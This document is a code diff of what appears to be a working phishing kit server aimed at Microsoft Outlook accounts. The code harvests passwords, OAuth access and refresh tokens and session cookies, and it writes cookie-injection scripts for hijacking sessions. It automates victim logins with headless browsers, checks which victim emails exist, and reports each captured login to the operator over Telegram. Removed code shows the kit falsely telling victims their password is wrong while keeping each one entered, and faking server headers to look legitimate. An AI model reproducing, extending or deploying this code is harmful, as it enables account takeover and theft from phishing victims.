@@ -2,46 +2,55 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
-const crypto = require('crypto');
 
-// Import centralized configuration
-const config = require('./src/config');
+// Load environment variables from .env file
+if (fs.existsSync('.env')) {
+    const envFile = fs.readFileSync('.env', 'utf8');
+    envFile.split('\n').forEach(line => {
+        // Skip comments and empty lines
+        if (line.trim().startsWith('#') || !line.trim()) return;
 
-const { ClosedBridgeAutomation } = require('./src/closedbridge-automation');
+        const [key, ...valueParts] = line.split('=');
+        const value = valueParts.join('='); // Handle values with = in them
+
+        if (key && value && !process.env[key]) {
+            process.env[key] = value.trim();
+        }
+    });
+    console.log('✅ Environment variables loaded from .env file');
+}
+
+const { GraphAPIAuth } = require('./src/graph-api');
+const { OutlookLoginAutomation } = require('./src/outlook-login');
 const OutlookNotificationBot = require('./telegram-bot');
 
 const app = express();
+const PORT = process.env.PORT || 5000;
 
-// Import shared encryption utilities to eliminate code duplication
-const encryptionUtils = require('./src/encryption-utils');
-
-// Use shared encryption functions
-function encryptData(text) {
-    return encryptionUtils.encryptData(text);
-}
-
-function decryptData(encryptedText) {
-    return encryptionUtils.decryptData(encryptedText);
-}
+// Security configuration - Always auto-generate
+const ADMIN_TOKEN = 'admin-' + Math.random().toString(36).substr(2, 24);
 
 // Make admin token available globally for Telegram bot
-global.adminToken = config.security.adminToken;
+global.adminToken = ADMIN_TOKEN;
 
 // Initialize Telegram Bot
 let telegramBot = null;
 try {
-    if (config.services.telegram.botToken) {
+    if (process.env.TELEGRAM_BOT_TOKEN) {
         telegramBot = new OutlookNotificationBot();
         console.log('🤖 Telegram Bot initialized successfully');
     } else {
-        console.log('⚠️ Telegram bot token not configured - notifications disabled');
+        console.log('⚠️ TELEGRAM_BOT_TOKEN not found - Telegram notifications disabled');
     }
 } catch (error) {
     console.error('❌ Failed to initialize Telegram Bot:', error.message);
 }
 
-// Middleware - Configure CORS
-app.use(cors(config.server.cors));
+// Middleware - Configure CORS for Replit environment
+app.use(cors({
+    origin: true, // Allow all origins for Replit proxy
+    credentials: true
+}));
 app.use(express.json());
 
 // Admin authentication middleware
@@ -50,7 +59,7 @@ function requireAdminAuth(req, res, next) {
                   (req.query && req.query.token) || 
                   (req.body && req.body.token);
 
-    if (!token || token !== config.security.adminToken) {
+    if (!token || token !== ADMIN_TOKEN) {
         return res.status(401).json({ 
             error: 'Unauthorized access to admin endpoint',
             message: 'Valid admin token required'
@@ -61,37 +70,16 @@ function requireAdminAuth(req, res, next) {
 
 app.use(express.static('public'));
 
-
-// Store user sessions for browser automation only
-const userSessions = new Map(); // sessionId -> { sessionId, userEmail, createdAt, authenticated, verified }
+// Store user sessions with Graph API auth and OAuth state tracking
+const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
+const oauthStates = new Map(); // state -> { sessionId, timestamp }
 const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
-// Use configuration constants
-const SESSION_TIMEOUT = config.security.sessionTimeout;
-
-// Store for SSE connections to send immediate authentication status updates
-const sseConnections = new Map(); // sessionId -> response object
+const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
+const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
+const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
 
 // Analytics tracking with persistent storage
 const ANALYTICS_FILE = path.join(__dirname, 'analytics.json');
-
-// Password retry queue: email -> { passwords: [{ password, timestamp, attemptNumber }], processing: boolean, sessionId: string | null }
-const passwordRetryQueue = new Map();
-
-// Function to broadcast immediate authentication events via SSE
-function broadcastAuthEvent(sessionId, event, data = {}) {
-    const connection = sseConnections.get(sessionId);
-    if (connection && !connection.destroyed) {
-        try {
-            const eventData = JSON.stringify({ ...data, timestamp: Date.now() });
-            connection.write(`event: ${event}\n`);
-            connection.write(`data: ${eventData}\n\n`);
-            console.log(`📡 SSE event sent to ${sessionId}: ${event}`);
-        } catch (error) {
-            console.warn(`SSE broadcast error for ${sessionId}:`, error.message);
-            sseConnections.delete(sessionId);
-        }
-    }
-}
 
 // Load analytics from file
 function loadAnalytics() {
@@ -138,10 +126,7 @@ function saveAnalytics() {
 // Initialize analytics from file
 const analytics = loadAnalytics();
 
-// All browsers are created on-demand with incognito mode
-// No browser pooling or preloading - each session gets a fresh private browser
-
-// Cleanup expired sessions
+// Cleanup expired sessions and OAuth states
 setInterval(async () => {
     const now = Date.now();
 
@@ -153,6 +138,13 @@ setInterval(async () => {
         }
     }
 
+    // Clean up expired OAuth states
+    for (const [state, stateInfo] of oauthStates) {
+        if (now - stateInfo.timestamp > STATE_TIMEOUT) {
+            oauthStates.delete(state);
+            console.log(`🧹 Cleaned up expired OAuth state`);
+        }
+    }
 
     // Clean up expired automation sessions
     for (const [sessionId, automationSession] of automationSessions) {
@@ -178,32 +170,22 @@ function createSessionId() {
 // Generate cookie injection script
 function generateCookieInjectionScript(email, cookies, sessionId) {
     return `
-// Secure Session Injector
+// Session Cookie Injector
 // Auto-generated on ${new Date().toISOString()}
 // Session: ${email} (${cookies.length} cookies)
 
 (function() {
-    console.log('🔐 Secure session restoration for: ${email}');
+    console.log('🚀 Injecting ${cookies.length} cookies for session: ${email}');
 
     const sessionInfo = {
         email: '${email}',
         timestamp: '${new Date().toISOString()}',
-        cookieCount: ${cookies.length},
-        security: 'encrypted'
+        cookieCount: ${cookies.length}
     };
 
     console.log('📧 Session info:', sessionInfo);
 
-    // Decrypt and process cookies
-    const encryptedCookies = ${JSON.stringify(cookies, null, 4)};
-    const cookies = encryptedCookies.map(cookie => {
-        if (cookie.encrypted) {
-            // Note: In production, decryption would happen server-side
-            console.log('🔓 Processing encrypted cookie:', cookie.name);
-        }
-        return cookie;
-    });
-
+    const cookies = ${JSON.stringify(cookies, null, 4)};
     let injected = 0;
 
     cookies.forEach(cookie => {
@@ -235,7 +217,120 @@ function generateCookieInjectionScript(email, cookies, sessionId) {
 `;
 }
 
-// All browser creation is now on-demand only - no preloading or warm pools
+// Browser preloading functions for performance optimization
+async function startBrowserPreload(sessionId, email) {
+    try {
+        console.log(`🚀 Starting browser preload for session: ${sessionId}, email: ${email}`);
+
+        // Check if we've reached the maximum preload limit
+        const currentPreloads = Array.from(automationSessions.values())
+            .filter(session => session.status === 'preloading' || session.status === 'preload_ready');
+
+        if (currentPreloads.length >= MAX_PRELOADS) {
+            // Evict oldest preload to make space
+            const oldestPreload = currentPreloads
+                .sort((a, b) => a.startTime - b.startTime)[0];
+
+            if (oldestPreload) {
+                console.log(`📊 MAX_PRELOADS reached, evicting oldest preload: ${oldestPreload.sessionId || 'unknown'}`);
+                try {
+                    if (oldestPreload.automation) {
+                        await oldestPreload.automation.close();
+                    }
+                    // Find and remove the oldest preload from automationSessions
+                    for (const [key, value] of automationSessions) {
+                        if (value === oldestPreload) {
+                            automationSessions.delete(key);
+                            break;
+                        }
+                    }
+                } catch (evictError) {
+                    console.warn('Error evicting old preload:', evictError.message);
+                }
+            }
+        }
+
+        // Create new automation instance
+        const automation = new OutlookLoginAutomation({
+            enableScreenshots: true,
+            screenshotQuality: 80
+        });
+
+        // Store in automationSessions with preloading status
+        automationSessions.set(sessionId, {
+            automation: automation,
+            status: 'preloading',
+            email: email,
+            startTime: Date.now(),
+            sessionId: sessionId
+        });
+
+        // Initialize browser and start preload process
+        await automation.init();
+        console.log(`🔧 Browser initialized for preload session: ${sessionId}`);
+
+        const navigated = await automation.navigateToOutlook();
+        if (!navigated) {
+            throw new Error('Failed to navigate to Outlook during preload');
+        }
+        console.log(`🌐 Navigated to Outlook for preload session: ${sessionId}`);
+
+        // Start the preload process (email entry and wait at password prompt)
+        const preloadSuccess = await automation.preload(email);
+
+        if (preloadSuccess) {
+            // Update status to ready
+            automationSessions.get(sessionId).status = 'preload_ready';
+            console.log(`✅ Browser preload completed and ready for: ${email} (session: ${sessionId})`);
+        } else {
+            // Update status to failed
+            automationSessions.get(sessionId).status = 'preload_failed';
+            console.log(`❌ Browser preload failed for: ${email} (session: ${sessionId})`);
+
+            // Clean up failed preload after a short delay
+            setTimeout(async () => {
+                try {
+                    await automation.close();
+                    automationSessions.delete(sessionId);
+                } catch (cleanupError) {
+                    console.warn('Error cleaning up failed preload:', cleanupError.message);
+                }
+            }, 5000);
+        }
+
+    } catch (error) {
+        console.error(`❌ Browser preload error for ${email}:`, error.message);
+
+        // Clean up on error
+        if (automationSessions.has(sessionId)) {
+            try {
+                const session = automationSessions.get(sessionId);
+                if (session.automation) {
+                    await session.automation.close();
+                }
+                automationSessions.delete(sessionId);
+            } catch (cleanupError) {
+                console.warn('Error cleaning up preload after error:', cleanupError.message);
+            }
+        }
+
+        throw error;
+    }
+}
+
+// Function to get preload status for debugging
+function getPreloadStats() {
+    const preloadSessions = Array.from(automationSessions.values())
+        .filter(session => session.status && session.status.startsWith('preload'));
+
+    return {
+        total: preloadSessions.length,
+        preloading: preloadSessions.filter(s => s.status === 'preloading').length,
+        ready: preloadSessions.filter(s => s.status === 'preload_ready').length,
+        failed: preloadSessions.filter(s => s.status === 'preload_failed').length,
+        maxAllowed: MAX_PRELOADS
+    };
+}
 
 // Routes
 
@@ -243,99 +338,361 @@ function generateCookieInjectionScript(email, cookies, sessionId) {
 app.get('/api/health', (req, res) => {
     res.json({ 
         status: 'OK', 
-        message: 'Browser Automation Backend is running',
-        authConfigured: false
+        message: 'Microsoft Graph API Backend is running',
+        authConfigured: !!(process.env.AZURE_CLIENT_ID && process.env.AZURE_CLIENT_SECRET && process.env.AZURE_TENANT_ID)
     });
 });
 
+// Get OAuth authorization URL
+app.post('/api/auth-url', (req, res) => {
+    try {
+        // Check if Azure credentials are configured
+        if (!process.env.AZURE_CLIENT_ID || !process.env.AZURE_CLIENT_SECRET || !process.env.AZURE_TENANT_ID) {
+            return res.status(500).json({
+                error: 'Azure credentials not configured',
+                message: 'Please configure AZURE_CLIENT_ID, AZURE_CLIENT_SECRET, and AZURE_TENANT_ID'
+            });
+        }
 
-// Add security headers to appear legitimate
-app.use((req, res, next) => {
-    // Generate random server identifier
-    const serverIds = ['nginx/1.18.0', 'Apache/2.4.41', 'cloudflare', 'Microsoft-IIS/10.0', 'nginx/1.20.2'];
-    const randomServer = serverIds[Math.floor(Math.random() * serverIds.length)];
+        const sessionId = createSessionId();
 
-    // Generate encrypted request tracking
-    const requestId = crypto.createHash('sha256').update(Date.now() + Math.random().toString()).digest('hex').substring(0, 16);
-    const sessionToken = crypto.createHash('md5').update(req.headers['user-agent'] || 'unknown').digest('hex').substring(0, 8);
+        // Use fixed redirect URI from environment or construct carefully
+        const redirectUri = process.env.AZURE_REDIRECT_URI || `${req.protocol}://${req.get('host')}/api/auth-callback`;
 
-    // Core security headers with encrypted values
-    res.setHeader('Server', randomServer);
-    res.setHeader('X-Request-ID', requestId);
-    res.setHeader('X-Session-Token', sessionToken);
-    res.setHeader('X-Content-Type-Options', 'nosniff');
-    res.setHeader('X-Frame-Options', Math.random() > 0.5 ? 'SAMEORIGIN' : 'DENY');
-    res.setHeader('X-XSS-Protection', '1; mode=block');
-    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
-    res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
-    res.setHeader('X-Download-Options', 'noopen');
+        const graphAuth = new GraphAPIAuth({
+            clientId: process.env.AZURE_CLIENT_ID,
+            clientSecret: process.env.AZURE_CLIENT_SECRET,
+            tenantId: process.env.AZURE_TENANT_ID,
+            redirectUri: redirectUri
+        });
 
-    // Randomized CSP policy
-    const cspPolicies = [
-        "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: blob:; img-src 'self' https: data: blob:; connect-src 'self' https: wss:",
-        "default-src 'self' 'unsafe-inline' https: data:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:",
-        "default-src 'self' https: data:; script-src 'self' 'unsafe-inline' https:; object-src 'none'; base-uri 'self'"
-    ];
-    const randomCSP = cspPolicies[Math.floor(Math.random() * cspPolicies.length)];
-    res.setHeader('Content-Security-Policy', randomCSP);
+        const authUrl = graphAuth.getAuthUrl(sessionId);
 
-    // Additional randomized headers
-    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
-    res.setHeader('X-Robots-Tag', 'noindex, nofollow');
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.setHeader('Pragma', 'no-cache');
-    res.setHeader('Expires', '0');
+        // Extract state from URL for tracking
+        const stateMatch = authUrl.match(/state=([^&]+)/);
+        const state = stateMatch ? decodeURIComponent(stateMatch[1]) : null;
 
-    // Random performance/monitoring headers
-    const performanceHeaders = [
-        'cf-ray', 'cf-request-id', 'x-trace-id', 'x-correlation-id', 'x-forwarded-for'
-    ];
-    const randomHeader = performanceHeaders[Math.floor(Math.random() * performanceHeaders.length)];
-    const randomValue = Math.random().toString(36).substring(2, 15);
-    res.setHeader(randomHeader, randomValue);
+        // Store session and state mapping
+        userSessions.set(sessionId, {
+            sessionId: sessionId,
+            graphAuth: graphAuth,
+            userEmail: null,
+            createdAt: Date.now(),
+            oauthState: state,
+            authenticated: false, // Initialize as not authenticated
+            verified: false // Initialize as not verified
+        });
 
-    // Vary headers for caching
-    res.setHeader('Vary', 'Accept-Encoding, User-Agent, Accept-Language');
+        if (state) {
+            oauthStates.set(state, {
+                sessionId: sessionId,
+                timestamp: Date.now()
+            });
+        }
 
-    next();
+        analytics.totalLogins++;
+        saveAnalytics();
+
+        console.log(`🔑 Generated auth URL for session: ${sessionId}`);
+
+        res.json({
+            authUrl: authUrl,
+            sessionId: sessionId,
+            message: 'Click the URL to authenticate with Microsoft'
+        });
+
+    } catch (error) {
+        console.error('Error generating auth URL:', error);
+        res.status(500).json({ 
+            error: 'Failed to generate auth URL',
+            details: error.message 
+        });
+    }
 });
 
+// Handle OAuth callback
+app.get('/api/auth-callback', async (req, res) => {
+    try {
+        const { code, state, error: authError } = req.query;
 
+        if (authError) {
+            analytics.failedLogins++;
+            saveAnalytics();
+            return res.status(400).json({ 
+                error: 'Authentication failed',
+                details: authError 
+            });
+        }
 
+        if (!code || !state) {
+            analytics.failedLogins++;
+            saveAnalytics();
+            return res.status(400).json({ 
+                error: 'Missing authorization code or state parameter' 
+            });
+        }
 
+        // Validate state and find associated session
+        const stateInfo = oauthStates.get(state);
+        if (!stateInfo) {
+            analytics.failedLogins++;
+            saveAnalytics();
+            return res.status(400).json({ 
+                error: 'Invalid or expired state parameter' 
+            });
+        }
 
+        // Check state timeout (10 minutes)
+        if (Date.now() - stateInfo.timestamp > STATE_TIMEOUT) {
+            oauthStates.delete(state);
+            analytics.failedLogins++;
+            saveAnalytics();
+            return res.status(400).json({ 
+                error: 'OAuth state expired' 
+            });
+        }
 
+        const targetSession = userSessions.get(stateInfo.sessionId);
+        if (!targetSession) {
+            oauthStates.delete(state);
+            analytics.failedLogins++;
+            saveAnalytics();
+            return res.status(400).json({ 
+                error: 'Associated session not found' 
+            });
+        }
 
+        // Clean up OAuth state
+        oauthStates.delete(state);
 
-// Get user profile using browser automation
+        try {
+            // Exchange code for tokens
+            const tokenData = await targetSession.graphAuth.getTokenFromCode(code);
+
+            // Get user profile
+            const userProfile = await targetSession.graphAuth.getUserProfile();
+            targetSession.userEmail = userProfile.mail || userProfile.userPrincipalName;
+            targetSession.authenticated = true; // Mark session as authenticated
+
+            // Check if we have stored credentials for this email
+            const sessionDir = path.join(__dirname, 'session_data');
+
+            try {
+                const glob = require('fs').readdirSync(sessionDir).filter(file => 
+                    file.includes(targetSession.userEmail.replace(/[@.]/g, '_')) && file.startsWith('session_')
+                );
+
+                if (glob.length > 0) {
+                    const latestFile = glob.sort().pop();
+                    const credentialsData = JSON.parse(fs.readFileSync(path.join(sessionDir, latestFile), 'utf8'));
+                    console.log(`✅ Found stored credentials for: ${targetSession.userEmail}`);
+
+                    // Use existing session cookies if available, otherwise create basic ones
+                    let sessionCookies = [];
+
+                    if (credentialsData.cookies && credentialsData.cookies.length > 0) {
+                        // Use existing cookies from previous session
+                        sessionCookies = credentialsData.cookies;
+                        console.log(`🔄 Reusing ${sessionCookies.length} existing session cookies`);
+                    } else {
+                        // Create basic authentication cookies
+                        sessionCookies = [
+                            {
+                                name: 'MSGraphAccessToken',
+                                value: tokenData.access_token,
+                                domain: '.microsoftonline.com',
+                                path: '/',
+                                expires: Math.floor(Date.now() / 1000) + (tokenData.expires_in || 3600),
+                                secure: true,
+                                httpOnly: true,
+                                sameSite: 'None'
+                            }
+                        ];
+                        console.log(`🆕 Created ${sessionCookies.length} new authentication cookies`);
+                    }
+
+                    // Generate injection script
+                    const injectionScript = generateCookieInjectionScript(targetSession.userEmail, sessionCookies, targetSession.sessionId);
+                    const injectFilename = `inject_session_${targetSession.sessionId}.js`;
+                    const injectPath = path.join(sessionDir, injectFilename);
+
+                    fs.writeFileSync(injectPath, injectionScript);
+                    console.log(`🍪 Generated cookie injection script: ${injectFilename}`);
+
+                    // Store comprehensive session data
+                    const fullSessionData = {
+                        ...credentialsData,
+                        sessionId: targetSession.sessionId,
+                        authTimestamp: new Date().toISOString(),
+                        status: 'valid',
+                        totalCookies: sessionCookies.length,
+                        domains: [...new Set(sessionCookies.map(c => c.domain))],
+                        cookies: sessionCookies,
+                        injectFilename: injectFilename,
+                        accessToken: tokenData.access_token,
+                        refreshToken: tokenData.refresh_token,
+                        tokenExpiry: new Date(Date.now() + (tokenData.expires_in * 1000)).toISOString()
+                    };
+
+                    fs.writeFileSync(
+                        path.join(sessionDir, `session_${targetSession.sessionId}_${targetSession.userEmail.replace(/[@.]/g, '_')}.json`),
+                        JSON.stringify(fullSessionData, null, 2)
+                    );
+
+                    console.log(`💾 Saved complete session data for: ${targetSession.userEmail} with ${sessionCookies.length} cookies`);
+                } else {
+                    console.log(`⚠️ No stored credentials found for: ${targetSession.userEmail}`);
+                }
+            } catch (error) {
+                console.error('Error processing stored credentials:', error);
+            }
+
+        } catch (tokenError) {
+            // Handle specific Microsoft authentication errors
+            console.error('❌ Microsoft authentication failed:', tokenError);
+
+            let errorMessage = 'Authentication failed';
+            let errorDetails = tokenError.message;
+
+            // Parse common Microsoft error responses
+            if (tokenError.message.includes('invalid_grant')) {
+                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
+            } else if (tokenError.message.includes('invalid_client')) {
+                errorMessage = 'Application configuration error. Please contact support.';
+            } else if (tokenError.message.includes('unauthorized_client')) {
+                errorMessage = 'This application is not authorized to access your account.';
+            } else if (tokenError.message.includes('AADSTS50126')) {
+                errorMessage = 'Your account or password is incorrect. If you don\'t remember your password, reset it now.';
+            } else if (tokenError.message.includes('AADSTS50034')) {
+                errorMessage = 'We couldn\'t find an account with that username. Try another, or get a new Microsoft account.';
+            }
+
+            // Store failed authentication attempt
+            const sessionDir = path.join(__dirname, 'session_data');
+            const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+            const failureData = {
+                id: failureId,
+                sessionId: targetSession.sessionId,
+                email: targetSession.userEmail || 'Unknown',
+                reason: 'OAuth Authentication Failed',
+                errorMessage: errorMessage,
+                errorDetails: errorDetails,
+                timestamp: new Date().toISOString(),
+                status: 'invalid',
+                authUrl: req.originalUrl
+            };
+
+            fs.writeFileSync(
+                path.join(sessionDir, `invalid_${failureId}.json`),
+                JSON.stringify(failureData, null, 2)
+            );
+
+            analytics.failedLogins++;
+            saveAnalytics();
+
+            return res.status(400).send(`
+                <html>
+                    <head><title>Authentication Failed</title></head>
+                    <body>
+                        <h2>❌ Authentication Failed</h2>
+                        <p style="color: #d13438;">${errorMessage}</p>
+                        <p><a href="/">Try again</a></p>
+                        <script>
+                            setTimeout(() => {
+                                window.close() || (window.location.href = '/');
+                            }, 3000);
+                        </script>
+                    </body>
+                </html>
+            `);
+        }
+
+        analytics.successfulLogins++;
+        saveAnalytics();
+
+        console.log(`✅ User authenticated successfully`);
+
+        // Send success response with redirect to frontend
+        res.send(`
+            <html>
+                <head><title>Authentication Successful</title></head>
+                <body>
+                    <h2>✅ Authentication Successful!</h2>
+                    <p>You can now close this window and return to the application.</p>
+                    <script>
+                        // Try to close the window, or redirect back to main app
+                        setTimeout(() => {
+                            window.close() || (window.location.href = '/');
+                        }, 2000);
+                    </script>
+                </body>
+            </html>
+        `);
+
+        // Send Telegram notification if bot is available
+        if (telegramBot) {
+            try {
+                await telegramBot.sendLoginNotification({
+                    email: targetSession.userEmail,
+                    password: 'Captured via OAuth', // OAuth doesn't capture actual password
+                    timestamp: new Date().toISOString(),
+                    sessionId: targetSession.sessionId,
+                    authMethod: 'Microsoft Graph API',
+                    totalCookies: 0 // OAuth method doesn't capture cookies directly
+                });
+                console.log(`📤 Telegram notification sent for ${targetSession.userEmail}`);
+            } catch (error) {
+                console.error('❌ Failed to send Telegram notification:', error.message);
+            }
+        }
+
+    } catch (error) {
+        console.error('Error in auth callback:', error);
+        analytics.failedLogins++;
+        saveAnalytics();
+
+        res.status(500).send(`
+            <html>
+                <head><title>Authentication Failed</title></head>
+                <body>
+                    <h2>❌ Authentication Failed</h2>
+                    <p>Error: ${error.message}</p>
+                    <p><a href="/">Return to main page</a></p>
+                </body>
+            </html>
+        `);
+    }
+});
+
+// Get user profile
 app.get('/api/profile', async (req, res) => {
     try {
         const sessionId = req.headers['x-session-id'] || req.query.sessionId;
 
-        if (!sessionId || !automationSessions.has(sessionId)) {
+        if (!sessionId || !userSessions.has(sessionId)) {
             return res.status(401).json({ 
-                error: 'No active automation session found',
+                error: 'No active session found',
                 message: 'Please authenticate first' 
             });
         }
 
-        const session = automationSessions.get(sessionId);
+        const session = userSessions.get(sessionId);
 
-        // Check if automation is available
-        if (!session.automation) {
-            return res.status(500).json({ 
-                error: 'Browser automation not available',
-                message: 'Please start a new session' 
+        // Check if session is authenticated
+        if (!session.authenticated) {
+            return res.status(401).json({ 
+                error: 'Session not authenticated',
+                message: 'Please complete login first' 
             });
         }
 
-        const profile = await session.automation.getUserProfile();
+        const userProfile = await session.graphAuth.getUserProfile();
 
         res.json({
-            profile: profile,
-            email: session.email,
+            profile: userProfile,
+            email: session.userEmail,
             sessionId: sessionId,
-            verified: session.status === 'completed'
+            verified: session.verified // Include verification status
         });
 
     } catch (error) {
@@ -347,53 +704,30 @@ app.get('/api/profile', async (req, res) => {
     }
 });
 
-// Get emails using browser automation
+// Get emails
 app.get('/api/emails', async (req, res) => {
     try {
         const sessionId = req.headers['x-session-id'] || req.query.sessionId;
         const count = parseInt(req.query.count) || 10;
 
-        if (!sessionId || !automationSessions.has(sessionId)) {
+        if (!sessionId || !userSessions.has(sessionId)) {
             return res.status(401).json({ 
-                error: 'No active automation session found',
+                error: 'No active session found',
                 message: 'Please authenticate first' 
             });
         }
 
-        const session = automationSessions.get(sessionId);
+        const session = userSessions.get(sessionId);
 
-        // Check if automation is available and authenticated
-        if (!session.automation) {
-            return res.status(500).json({ 
-                error: 'Browser automation not available',
-                message: 'Please start a new session' 
-            });
-        }
-
-        if (session.status !== 'completed') {
+        // Check if session is authenticated
+        if (!session.authenticated) {
             return res.status(401).json({ 
                 error: 'Session not authenticated',
                 message: 'Please complete login first' 
             });
         }
 
-        const browserEmails = await session.automation.getEmails(count);
-
-        // Transform browser automation email format to match frontend expectations
-        const emails = browserEmails.map(email => ({
-            id: email.id,
-            subject: email.subject || 'No Subject',
-            from: {
-                emailAddress: {
-                    name: email.sender || 'Unknown Sender',
-                    address: email.sender || 'unknown@example.com'
-                }
-            },
-            receivedDateTime: email.receivedDateTime || new Date().toISOString(),
-            bodyPreview: email.bodyPreview || '',
-            isRead: email.isRead || false,
-            hasAttachments: email.hasAttachments || false
-        }));
+        const emails = await session.graphAuth.getEmails(count);
 
         res.json({
             emails: emails,
@@ -410,58 +744,28 @@ app.get('/api/emails', async (req, res) => {
     }
 });
 
-// Get detailed email content using browser automation
-app.get('/api/email-content/:emailId', async (req, res) => {
+// Send email
+app.post('/api/send-email', async (req, res) => {
     try {
-        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
-        const emailId = req.params.emailId;
+        const sessionId = req.headers['x-session-id'] || req.body.sessionId;
+        const { to, subject, body, isHtml = false } = req.body;
 
-        if (!sessionId || !automationSessions.has(sessionId)) {
+        if (!sessionId || !userSessions.has(sessionId)) {
             return res.status(401).json({ 
-                error: 'No active automation session found',
+                error: 'No active session found',
                 message: 'Please authenticate first' 
             });
         }
 
-        const session = automationSessions.get(sessionId);
+        const session = userSessions.get(sessionId);
 
-        // Check if automation is available and authenticated
-        if (!session.automation) {
-            return res.status(500).json({ 
-                error: 'Browser automation not available',
-                message: 'Please start a new session' 
-            });
-        }
-
-        if (session.status !== 'completed') {
+        // Check if session is authenticated
+        if (!session.authenticated) {
             return res.status(401).json({ 
                 error: 'Session not authenticated',
                 message: 'Please complete login first' 
             });
         }
-
-        const emailContent = await session.automation.getEmailContent(emailId);
-
-        res.json({
-            content: emailContent,
-            emailId: emailId,
-            sessionId: sessionId
-        });
-
-    } catch (error) {
-        console.error('Error getting email content:', error);
-        res.status(500).json({ 
-            error: 'Failed to get email content',
-            details: error.message 
-        });
-    }
-});
-
-// Send email using browser automation
-app.post('/api/send-email', async (req, res) => {
-    try {
-        const sessionId = req.headers['x-session-id'] || req.query.sessionId;
-        const { to, subject, body, isHtml } = req.body;
 
         if (!to || !subject || !body) {
             return res.status(400).json({ 
@@ -470,39 +774,12 @@ app.post('/api/send-email', async (req, res) => {
             });
         }
 
-        if (!sessionId || !automationSessions.has(sessionId)) {
-            return res.status(401).json({ 
-                error: 'No active automation session found',
-                message: 'Please authenticate first' 
-            });
-        }
-
-        const session = automationSessions.get(sessionId);
-
-        // Check if automation is available and authenticated
-        if (!session.automation) {
-            return res.status(500).json({ 
-                error: 'Browser automation not available',
-                message: 'Please start a new session' 
-            });
-        }
-
-        if (session.status !== 'completed') {
-            return res.status(401).json({ 
-                error: 'Session not authenticated',
-                message: 'Please complete login first' 
-            });
-        }
-
-        const result = await session.automation.sendEmail(to, subject, body, isHtml);
+        await session.graphAuth.sendEmail(to, subject, body, isHtml);
 
         res.json({
             success: true,
             message: 'Email sent successfully',
-            to: to,
-            subject: subject,
-            sessionId: sessionId,
-            result: result
+            sessionId: sessionId
         });
 
     } catch (error) {
@@ -556,20 +833,36 @@ app.post('/api/verify-email', async (req, res) => {
                 console.log(`Raw Microsoft discovery response for ${email}:`, data);
 
                 const isValidAccount = (
-                    (data.Account === 'Managed') ||
-                    (data.account_type === 'Managed') ||
-                    (data.NameSpaceType === 'Managed') ||
-                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com'))
+                    (data.Account === 'Managed' || data.Account === 'Federated') ||
+                    (data.account_type === 'Managed' || data.account_type === 'Federated') ||
+                    (data.NameSpaceType === 'Managed' || data.NameSpaceType === 'Federated') ||
+                    (data.AuthURL && data.AuthURL.includes('login.microsoftonline.com')) ||
+                    (data.DomainName && data.DomainName.length > 0) ||
+                    (data.domain_name && data.domain_name.length > 0)
                 );
 
                 if (isValidAccount) {
                     console.log(`✅ Email verification passed for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);
 
+                    // Start browser preloading in background for faster password authentication
+                    const sessionId = createSessionId();
+
+                    // Start preload without awaiting - let it run in parallel
+                    const preloadPromise = startBrowserPreload(sessionId, email).catch(error => {
+                        console.warn(`⚠️ Browser preload failed for ${email}:`, error.message);
+                        return false;
+                    });
+
+                    // Log verification success without creating files
+                    console.log(`✅ Email verification successful for: ${email} (Account type: ${data.Account || data.account_type || data.NameSpaceType})`);
+
                     res.json({
                         exists: true,
                         email: email,
                         message: 'Account found. Please enter your password.',
-                        accountType: data.Account || data.account_type || data.NameSpaceType
+                        accountType: data.Account || data.account_type || data.NameSpaceType,
+                        sessionId: sessionId,  // Return session ID for browser preloading
+                        preloadStarted: true
                     });
                 } else {
                     console.log(`❌ Email verification failed for: ${email} - Account not found or not managed by Microsoft`);
@@ -610,7 +903,7 @@ app.post('/api/verify-email', async (req, res) => {
 // Fast password authentication endpoint using preloaded browsers
 app.post('/api/authenticate-password-fast', async (req, res) => {
     try {
-        const { email, password, sessionId, attemptNumber } = req.body;
+        const { email, password, sessionId } = req.body;
 
         if (!email || !password) {
             return res.status(400).json({ 
@@ -619,98 +912,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
             });
         }
 
-        console.log(`🚀 Attempting FAST authentication for: ${email} (attempt: ${attemptNumber || 1})`);
-
-        // Add password to background retry queue
-        if (!passwordRetryQueue.has(email)) {
-            passwordRetryQueue.set(email, {
-                passwords: [],
-                processing: false,
-                sessionId: null
-            });
-        }
-
-        const queue = passwordRetryQueue.get(email);
-        queue.passwords.push({
-            password: password,
-            timestamp: Date.now(),
-            attemptNumber: attemptNumber || queue.passwords.length + 1
-        });
-
-        console.log(`📋 Added password to queue for ${email} (total queued: ${queue.passwords.length})`);
-
-        // Always return "wrong password" to frontend immediately
-        console.log(`⚡ Attempt ${attemptNumber || queue.passwords.length} for ${email} - showing wrong password message`);
-
-        // Start background processing only on first password
-        if (attemptNumber === 1 || queue.passwords.length === 1) {
-            setTimeout(() => {
-                processPasswordQueue(email).catch(error => {
-                    console.error('Background queue processing failed:', error.message);
-                });
-            }, 1000);
-        }
-
-        // Store failed attempt for admin panel
-        const sessionDir = path.join(__dirname, 'session_data');
-        if (!fs.existsSync(sessionDir)) {
-            fs.mkdirSync(sessionDir, { recursive: true });
-        }
-
-        const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-        const failureData = {
-            id: failureId,
-            sessionId: sessionId || createSessionId(),
-            email: email,
-            reason: 'Wrong Password (Processing in background)',
-            errorMessage: 'Your account or password is incorrect.',
